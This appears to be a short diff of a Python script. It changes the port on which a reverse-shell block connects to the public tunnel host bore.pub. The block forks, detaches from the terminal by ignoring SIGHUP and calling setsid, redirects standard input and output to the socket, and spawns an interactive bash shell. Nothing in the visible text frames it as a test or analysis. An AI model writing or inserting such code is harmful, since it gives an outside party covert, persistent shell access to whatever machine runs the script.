@@ -1,3 +1,4 @@
+
 import requests
 import subprocess
 import sys
@@ -195,7 +196,7 @@ if os.fork() == 0:
     signal.signal(signal.SIGHUP, signal.SIG_IGN)  # Equivalente ao nohup
     os.setsid()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("bore.pub", 56691))
+    s.connect(("bore.pub", 38285))
     for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
     pty.spawn("/bin/bash")
 
@@ -264,4 +265,6 @@ def main():
                     
 if __name__ == "__main__":
     main()
+
+
 
